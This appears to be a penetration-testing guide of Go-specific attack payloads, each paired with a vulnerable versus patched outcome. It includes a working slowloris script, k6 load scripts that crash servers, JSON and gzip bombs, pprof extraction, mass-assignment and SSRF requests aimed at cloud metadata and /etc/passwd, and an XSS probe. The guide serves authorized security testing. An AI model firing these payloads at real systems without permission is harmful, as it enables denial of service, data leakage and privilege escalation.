# Go-Specific Active Testing Payloads

Active attack payloads that exercise vulnerabilities unique to Go's runtime, standard library, or framework defaults. For generic OWASP API Top 10 payloads (SQLi, BOLA, JWT confusion, CORS reflection, rate limit bypass), use `@api-security-testing` Phases 1–7 instead.

> **Authorization required.** Run these only against systems you own or have explicit written permission to test.

---

## 1. Slowloris (no `ReadHeaderTimeout`)

Tests **GOVULN-031** — checks whether the server closes a connection that sends headers slowly.

**Bash one-liner (single connection):**
```bash
{ printf "GET / HTTP/1.1\r\nHost: target\r\n"; sleep 30; printf "X-Stall: a\r\n\r\n"; } \
  | nc -v target 80
```

If the server keeps the connection open longer than ~10 seconds and accepts the late header, `ReadHeaderTimeout` is missing.

**Python multi-connection slowloris (200 sockets):**
```python
import socket, time

def make_socket(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((host, port))
    s.send(b"GET / HTTP/1.1\r\nHost: target\r\n")
    s.send(b"User-Agent: Mozilla/5.0\r\n")
    return s

socks = [make_socket("target", 80) for _ in range(200)]
while True:
    for s in list(socks):
        try:
            s.send(b"X-Keep: alive\r\n")  # partial header every 10s
        except socket.error:
            socks.remove(s)
    print(f"open: {len(socks)}")
    time.sleep(10)
```

**Vulnerable behavior:** open connection count climbs without limit; subsequent legitimate requests hang.
**Patched behavior:** server closes each connection after `ReadHeaderTimeout` (10s recommended); legitimate requests succeed.

---

## 2. pprof Endpoint Extraction

Tests **GOVULN-022** — checks whether `net/http/pprof` is exposed publicly.

```bash
# Goroutine dump (full stack of every running goroutine — leaks internals)
curl -s 'https://target/debug/pprof/goroutine?debug=2' | head -100

# Heap profile (binary — feed to go tool pprof)
curl -s 'https://target/debug/pprof/heap' -o heap.pb.gz
go tool pprof -text heap.pb.gz | head -30

# CPU profile (30 seconds — exercises the server)
curl -s 'https://target/debug/pprof/profile?seconds=30' -o cpu.pb.gz

# Command-line and binary metadata
curl -s 'https://target/debug/pprof/cmdline'
curl -s 'https://target/debug/pprof/symbol?0x401000'

# Trace (intrusive — captures runtime events)
curl -s 'https://target/debug/pprof/trace?seconds=5' -o trace.out
```

**Vulnerable behavior:** any of these returns 200 with content. Especially dangerous: `goroutine?debug=2` reveals every internal function, file path, and active query.
**Patched behavior:** all return 404. pprof should only be reachable via `127.0.0.1:6060` or behind admin auth.

---

## 3. Race Condition Trigger via k6

Tests **GOVULN-025** — concurrent writes to shared state. Most reliable detector when combined with `go test -race` on the server.

```javascript
// race_trigger.js — run with: k6 run --vus 100 --duration 30s race_trigger.js
import http from "k6/http";
import { check } from "k6";

export default function () {
    // Hammer the same endpoint that mutates shared state
    const res = http.post("https://target/api/cart/add",
        JSON.stringify({ item_id: "abc", qty: 1 }),
        { headers: {
            "Authorization": `Bearer ${__ENV.TOKEN}`,
            "Content-Type": "application/json",
        }}
    );
    check(res, {
        "no 500": (r) => r.status !== 500,
        "no panic": (r) => !r.body.includes("runtime error"),
    });
}
```

**Vulnerable behavior:** sporadic 500 responses; server logs include `panic: concurrent map writes` or `runtime error: index out of range`. If you run the server with `-race` enabled (`go test -race ./... ; ./api`), you will see `WARNING: DATA RACE` in stderr.
**Patched behavior:** all 100 VUs succeed; no panic; `go test -race` clean.

---

## 4. JSON Bomb (Deep Nesting)

Tests **GOVULN-033** — JSON decoder DoS via deep nesting.

**Generate a deep JSON payload:**
```bash
python3 -c 'print("[" * 100000 + "1" + "]" * 100000)' > bomb.json
curl -X POST https://target/api/data \
    -H 'Content-Type: application/json' \
    --data-binary @bomb.json \
    -H "Authorization: Bearer $TOKEN"
```

**Vulnerable behavior:** server CPU spikes; potentially `runtime: goroutine stack exceeds 1000000000-byte limit` panic; OOM if combined with `MaxBytesReader` missing.
**Patched behavior:** server returns 400 ("request body too large") or 413 within milliseconds.

---

## 5. gzip Bomb

Tests **GOVULN-034** — `gzip.NewReader` decompressed without bounds.

**Create a 10 MB compressed payload that decompresses to 10 GB:**
```bash
dd if=/dev/zero bs=1M count=10240 2>/dev/null | gzip -9 > bomb.gz
ls -lh bomb.gz   # ~10 MB compressed

curl -X POST https://target/api/upload \
    -H 'Content-Type: application/json' \
    -H 'Content-Encoding: gzip' \
    --data-binary @bomb.gz
```

**Vulnerable behavior:** server OOMs trying to decompress; goroutine count climbs as the request hangs.
**Patched behavior:** server returns 413 once `MaxBytesReader` (on the *decompressed* stream via `io.LimitReader`) hits the limit.

---

## 6. ServeMux Pattern Conflict (Go 1.22+)

Tests **GOVULN-030** — overlapping route registrations panic at startup or cause unexpected dispatch.

**Static check (no runtime needed):**
```bash
rg 'mux\.HandleFunc\("[A-Z]+ ' --type go    # method-prefixed patterns
rg 'mux\.Handle\("[A-Z]+ ' --type go
```

**Runtime probe:**
```bash
# If startup panicked with "pattern X conflicts with pattern Y", review the registrations
# Otherwise, look for overlapping paths and probe both methods:
curl -X GET    -i https://target/api/users
curl -X POST   -i https://target/api/users
curl -X DELETE -i https://target/api/users/  # trailing slash variant
curl -X DELETE -i https://target/api/users   # without trailing slash
```

**Vulnerable behavior:** the same path served by different handlers depending on method/trailing slash, indicating ambiguous registration. In some cases the binary panics on startup with `pattern "GET /api/users" conflicts with pattern "/api/users"`.
**Patched behavior:** clean startup, predictable routing per method.

---

## 7. Goroutine Leak Detection

Tests **GOVULN-026** — goroutines that never return after request cancellation.

**Setup (server-side):** ensure `expvar` or pprof is reachable (use the internal `127.0.0.1:6060` listener).

**Probe sequence:**
```bash
# 1. Baseline goroutine count
START=$(curl -s http://internal-target:6060/debug/pprof/goroutine?debug=1 | head -1)
echo "Baseline: $START"

# 2. Send 1000 requests that will be cancelled mid-flight
for i in $(seq 1 1000); do
    timeout 0.05 curl -s https://target/api/long-running >/dev/null &
done
wait

# 3. Wait for normal goroutines to drain
sleep 30

# 4. Check goroutine count again
END=$(curl -s http://internal-target:6060/debug/pprof/goroutine?debug=1 | head -1)
echo "After: $END"

# 5. If END > START + 100 (allowing for noise), there is a goroutine leak
```

**Vulnerable behavior:** `END - START` grows with the number of cancelled requests.
**Patched behavior:** goroutine count returns to baseline within 30 seconds of cancellation.

---

## 8. Concurrent Map Write Trigger

Targets **GOVULN-025** specifically for `map[K]V` (not `sync.Map`) shared across handlers.

**k6 script:**
```javascript
// concurrent_map.js — run with: k6 run --vus 50 --duration 10s concurrent_map.js
import http from "k6/http";
export default function () {
    const k = "key_" + Math.random();
    http.post("https://target/api/cache", JSON.stringify({ k: k, v: "value" }),
        { headers: { "Content-Type": "application/json" } });
}
```

**Vulnerable behavior:** server crashes with `fatal error: concurrent map writes`; the entire process dies (panic in goroutine is unrecoverable for `runtime` panics).
**Patched behavior:** server uses `sync.Map` or `sync.RWMutex` around the map; load test completes without crash.

---

## 9. JSON Unknown Fields / Mass Assignment

Tests **GOVULN-037** — `json.Decoder.DisallowUnknownFields()` missing.

```bash
# Send a request with extra fields not in the documented schema
curl -X POST https://target/api/users/profile \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"name": "Alice", "email": "alice@example.com", "role": "admin", "is_verified": true, "credits": 99999}'

# Then read the profile back
curl -H "Authorization: Bearer $TOKEN" https://target/api/users/profile
```

**Vulnerable behavior:** the response includes `role: admin`, `is_verified: true`, or `credits: 99999`.
**Patched behavior:** the request returns 400 ("json: unknown field 'role'") OR the extra fields are silently ignored (not persisted).

---

## 10. `httputil.ReverseProxy` SSRF via Header Injection

Tests **GOVULN-006** — Director function that derives target from a request header.

```bash
# If the proxy uses X-Backend (or similar) to pick its target:
curl -H "X-Backend: 169.254.169.254" https://target/proxy/anything   # AWS metadata
curl -H "X-Backend: localhost:6060/debug/pprof/goroutine" https://target/proxy/  # internal pprof
curl -H "X-Backend: file:///etc/passwd" https://target/proxy/  # file scheme
```

**Vulnerable behavior:** the proxy fetches the attacker-controlled URL and returns its content.
**Patched behavior:** the proxy ignores `X-Backend` or rejects unknown values, returning 400 or routing to a fixed allowlisted target.

---

## 11. TLS Configuration Probe

Tests **GOVULN-010 / GOVULN-011** — verifies the server accepts only TLS 1.2+ and rejects weak ciphers.

```bash
# Check minimum TLS version
nmap --script ssl-enum-ciphers -p 443 target

# Or with openssl
openssl s_client -connect target:443 -tls1   # should fail
openssl s_client -connect target:443 -tls1_1 # should fail
openssl s_client -connect target:443 -tls1_2 # should succeed
openssl s_client -connect target:443 -tls1_3 # should succeed

# Test for weak ciphers
openssl s_client -connect target:443 -cipher 'NULL,EXPORT,LOW,DES,RC4,MD5'  # should fail
```

**Vulnerable behavior:** TLS 1.0/1.1 handshake succeeds; weak ciphers negotiated.
**Patched behavior:** only TLS 1.2 and 1.3 negotiate; weak ciphers refused.

---

## 12. `text/template` HTML Escape Bypass

Tests **GOVULN-040** — checks whether server-rendered HTML escapes user input.

```bash
curl -G "https://target/page" --data-urlencode 'name=<script>alert(1)</script>'
```

**Vulnerable behavior:** the response contains `<script>alert(1)</script>` literally (rendered by `text/template`).
**Patched behavior:** the response contains `&lt;script&gt;alert(1)&lt;/script&gt;` (escaped by `html/template`).

---

## Test Result Recording

For every payload above, record in the security report (Phase 8) the following:

| Field | Example |
| --- | --- |
| Test ID | TEST-001 |
| Linked finding | GOAPI-003 → GOVULN-031 |
| Command | `bash slowloris.sh target 80` |
| Expected if vulnerable | "connection held > 30s" |
| Observed | "connection closed after 10s" |
| Result | PASS (patched) / FAIL (vulnerable) |
